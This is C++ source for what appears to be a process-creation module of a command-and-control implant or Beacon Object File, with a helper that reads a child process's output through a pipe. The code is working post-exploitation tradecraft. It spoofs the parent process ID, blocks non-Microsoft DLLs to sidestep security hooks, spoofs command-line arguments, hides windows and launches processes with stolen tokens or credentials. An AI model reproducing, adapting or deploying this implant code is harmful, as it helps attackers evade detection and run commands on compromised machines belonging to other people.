#include <general.h>
#include <externs.h>

#define PIPE_READ_TIMEOUT_MS  10000
#define PIPE_POLL_INTERVAL_MS 100

#ifndef MIN
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#endif

auto read_pipe_output(
    _In_      HANDLE  pipe_read,
    _In_      HANDLE  process_handle,
    _Out_opt_ PBYTE*  out_buffer,
    _Out_opt_ ULONG*  out_length
) -> NTSTATUS {
    DbgPrint( "[read_pipe_output] Starting pipe read loop\n" );

    // Inicializar outputs
    if ( out_buffer ) *out_buffer = nullptr;
    if ( out_length ) *out_length = 0;

    DWORD  total_elapsed   = 0;
    DWORD  bytes_available = 0;
    DWORD  bytes_read      = 0;
    BYTE   read_buffer[4096];
    BOOL   process_exited  = FALSE;

    SIZE_T output_capacity = 0x10000;
    SIZE_T output_size     = 0;
    PBYTE  output_buffer   = (PBYTE)malloc( output_capacity );

    if ( !output_buffer ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to allocate output buffer" );
        return STATUS_NO_MEMORY;
    }

    while ( total_elapsed < PIPE_READ_TIMEOUT_MS ) {
        DWORD wait_result = WaitForSingleObject( process_handle, 0 );
        if ( wait_result == WAIT_OBJECT_0 ) {
            if ( !process_exited ) {
            }
            process_exited = TRUE;
        }

        bytes_available = 0;
        BOOL peek_result = PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr );

        if ( !peek_result ) {
            DWORD peek_error = GetLastError();

            if ( peek_error == ERROR_BROKEN_PIPE ) {
                break;
            }
        }

        if ( bytes_available > 0 ) {
            while ( bytes_available > 0 ) {
                DWORD to_read = MIN( bytes_available, (DWORD)sizeof(read_buffer) );
                bytes_read = 0;

                if ( !ReadFile( pipe_read, read_buffer, to_read, &bytes_read, nullptr ) ) {
                    break;
                }

                if ( bytes_read == 0 ) {
                    break;
                }

                while ( output_size + bytes_read > output_capacity ) {
                    SIZE_T new_capacity = output_capacity * 2;

                    PBYTE new_buffer = (PBYTE)realloc( output_buffer, new_capacity );

                    if ( !new_buffer ) {
                        if ( out_buffer && out_length ) {
                            *out_buffer = output_buffer;
                            *out_length = (ULONG)output_size;
                        } else {
                            free( output_buffer );
                        }
                        return STATUS_NO_MEMORY;
                    }

                    output_buffer   = new_buffer;
                    output_capacity = new_capacity;
                }

                memcpy( output_buffer + output_size, read_buffer, bytes_read );
                output_size += bytes_read;

                bytes_available -= bytes_read;
            }

            total_elapsed = 0;
        } else {
            if ( process_exited ) {
                WaitForSingleObject( nt_current_process(), 50 );

                if ( PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_available, nullptr ) && bytes_available == 0 ) {
                    DbgPrint( "[read_pipe_output] No more data - done\n" );
                    break;
                }
            } else {
                WaitForSingleObject( nt_current_process(), PIPE_POLL_INTERVAL_MS );
                total_elapsed += PIPE_POLL_INTERVAL_MS;
            }
        }
    }

    if ( output_size > 0 ) {
        if ( output_size >= output_capacity ) {
            PBYTE new_buffer = (PBYTE)realloc( output_buffer, output_size + 1 );
            if ( new_buffer ) {
                output_buffer = new_buffer;
            }
        }
        output_buffer[output_size] = '\0';

        if ( out_buffer && out_length ) {
            *out_buffer = output_buffer;
            *out_length = (ULONG)output_size;
        } else {
            free( output_buffer );
        }
    } else {
        free( output_buffer );
    }

    return STATUS_SUCCESS;
}

extern "C" auto kh_process_creation( 
    _In_      PS_CREATE_ARGS*      create_args,
    _Out_opt_ PROCESS_INFORMATION* ps_information,
    _Out_opt_ PBYTE*               output_ptr,
    _Out_opt_ ULONG*               output_len
) -> ULONG {
    if ( output_ptr ) *output_ptr = nullptr;
    if ( output_len ) *output_len = 0;

    BEACON_INFO* info = (BEACON_INFO*)malloc( sizeof( BEACON_INFO ) );

    BeaconInformation( info );

    create_args->ppid      = info->Config->Ps.ParentID;
    create_args->blockdlls = info->Config->Ps.BlockDlls;
    create_args->spoofarg  = info->Config->Ps.SpoofArg;

    auto process_cmdline = (*create_args->spoofarg ? create_args->spoofarg : create_args->argument);
    auto process_info    = PROCESS_INFORMATION{ 0 };
    auto startup_info_ex = STARTUPINFOEXW{ 0 };
    auto startup_info    = STARTUPINFOW{ 0 };
    auto security_attr   = SECURITY_ATTRIBUTES{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    auto process_flags   = DWORD{ CREATE_NO_WINDOW };
    auto process_policy  = UINT_PTR{ 0 };

    auto pipe_read      = HANDLE{ nullptr };
    auto pipe_write     = HANDLE{ nullptr };
    auto pipe_duplicate = HANDLE{ nullptr };
    auto parent_handle  = HANDLE{ nullptr };

    auto attribute_buff = PVOID{ nullptr };
    auto attribute_size = SIZE_T{ 0 };

    auto update_attr_count = 0;
    auto use_extended_info = FALSE;

    ULONG error_code = ERROR_SUCCESS;
    BOOL  success    = FALSE;

    auto cleanup = [&]( NTSTATUS ret_status ) -> NTSTATUS {

        if ( attribute_buff ) {
            DeleteProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff );
            free( attribute_buff );
        }

        if ( pipe_read     ) { CloseHandle( pipe_read     ); DbgPrint( "[cleanup] Closed pipe_read\n"     ); }
        if ( pipe_write    ) { CloseHandle( pipe_write    ); DbgPrint( "[cleanup] Closed pipe_write\n"    ); }
        if ( parent_handle ) { CloseHandle( parent_handle ); DbgPrint( "[cleanup] Closed parent_handle\n" ); }

        return ret_status;
    };

    use_extended_info = ( create_args->method == Create::Default );

    if ( use_extended_info ) {
        if ( create_args->ppid      ) update_attr_count++;
        if ( create_args->blockdlls ) update_attr_count++;
    }

    if ( update_attr_count > 0 ) {
        InitializeProcThreadAttributeList( nullptr, update_attr_count, 0, &attribute_size );
        
        attribute_buff = malloc( attribute_size );
        if ( !attribute_buff ) {
            error_code = GetLastError();
            BeaconPrintf( CALLBACK_ERROR, "Failed to allocate attribute buffer" );
            return cleanup( STATUS_NO_MEMORY );
        }

        if ( !InitializeProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, update_attr_count, 0, &attribute_size ) ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to initialize attribute list: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( STATUS_UNSUCCESSFUL );
        }
    }

    if ( use_extended_info && create_args->ppid ) {        
        parent_handle = OpenProcess( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, create_args->ppid );
        if ( !parent_handle ) {
            error_code = GetLastError();
            BeaconPrintf( CALLBACK_ERROR, "Failed to open parent process %d: (%d) %ls", create_args->ppid, error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }

        if ( !UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent_handle, sizeof(HANDLE), nullptr, nullptr ) ) {
            error_code = GetLastError();
            BeaconPrintf( CALLBACK_ERROR, "Failed to update parent process attribute: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
    }

    if ( use_extended_info && create_args->blockdlls ) {
        process_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        
        if ( !UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &process_policy, sizeof(UINT_PTR), nullptr, nullptr ) ) {
            error_code = GetLastError();
            BeaconPrintf( CALLBACK_ERROR, "Failed to update mitigation policy attribute: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }
    }

    if ( use_extended_info ) {
        startup_info_ex.StartupInfo.cb          = sizeof( STARTUPINFOEXW );
        startup_info_ex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info_ex.StartupInfo.wShowWindow = SW_HIDE;
        
        if ( attribute_buff ) {
            startup_info_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff;
            process_flags |= EXTENDED_STARTUPINFO_PRESENT;
        }
    } else {
        startup_info.cb          = sizeof( STARTUPINFOW );
        startup_info.dwFlags     = STARTF_USESHOWWINDOW;
        startup_info.wShowWindow = SW_HIDE;
    }

    if ( create_args->pipe ) {
        if ( ! CreatePipe( &pipe_read, &pipe_write, &security_attr, 0 ) ) {
            error_code = GetLastError();
            BeaconPrintf( CALLBACK_ERROR, "Failed to create pipe: (%d) %ls", error_code, fmt_error( error_code ) );
            return cleanup( error_code );
        }

        SetHandleInformation( pipe_read, HANDLE_FLAG_INHERIT, 0 );

        if ( use_extended_info && create_args->ppid && parent_handle ) {
            if ( !DuplicateHandle( nt_current_process(), pipe_write, parent_handle, &pipe_duplicate, 0, TRUE, DUPLICATE_SAME_ACCESS ) ) {
                error_code = GetLastError();
                BeaconPrintf( CALLBACK_ERROR, "Failed to duplicate pipe handle: (%d) %ls", error_code, fmt_error( error_code ) );
                return cleanup( error_code );
            }

            CloseHandle( pipe_write );
            pipe_write = pipe_duplicate;
        }

        if ( use_extended_info ) {
            startup_info_ex.StartupInfo.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info_ex.StartupInfo.hStdError   = pipe_write;
            startup_info_ex.StartupInfo.hStdOutput  = pipe_write;
            startup_info_ex.StartupInfo.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
        } else {
            startup_info.dwFlags    |= STARTF_USESTDHANDLES;
            startup_info.hStdError   = pipe_write;
            startup_info.hStdOutput  = pipe_write;
            startup_info.hStdInput   = GetStdHandle( STD_INPUT_HANDLE );
        }
    }

    switch ( create_args->method ) {
        case Create::Default: {
            success = CreateProcessW(
                nullptr, process_cmdline, nullptr, nullptr, TRUE, process_flags, 
                nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info
            );
            break;
        }

        case Create::WithLogon: {
            success = CreateProcessWithLogonW(
                create_args->username, create_args->domain, create_args->password, LOGON_WITH_PROFILE,
                nullptr, process_cmdline, CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info
            );
            break;
        }

        case Create::WithToken: {
            success = CreateProcessWithTokenW(
                create_args->token, LOGON_WITH_PROFILE, nullptr, process_cmdline, 
                CREATE_NO_WINDOW, nullptr, nullptr, &startup_info, &process_info 
            );
            break;
        }

        default: {
            BeaconPrintf( CALLBACK_ERROR, "Unknown process creation method: %d", create_args->method );
            return cleanup( STATUS_INVALID_PARAMETER );
        }
    }

    if ( ! success ) {
        error_code = GetLastError();
        BeaconPrintf( CALLBACK_ERROR, "Failed to create process with error: (%d) %ls", error_code, fmt_error( error_code ) );
        return cleanup( error_code );
    }

    if ( pipe_write ) {
        CloseHandle( pipe_write );
        pipe_write = nullptr;
    }

    if ( create_args->pipe && pipe_read ) {
        PBYTE  pipe_output = nullptr;
        ULONG  pipe_length = 0;

        NTSTATUS read_status = read_pipe_output( pipe_read, process_info.hProcess, &pipe_output, &pipe_length );

        if ( nt_success(read_status) && pipe_output && pipe_length > 0 ) {
            if ( output_ptr && output_len ) {
                *output_ptr = pipe_output;
                *output_len = pipe_length;
            } else {
                free( pipe_output );
            }
        }
    }

    if ( ps_information ) {
        *ps_information = process_info;
    } else {
        if ( process_info.hProcess ) CloseHandle( process_info.hProcess );
        if ( process_info.hThread  ) CloseHandle( process_info.hThread  );
    }

    return cleanup( STATUS_SUCCESS );
}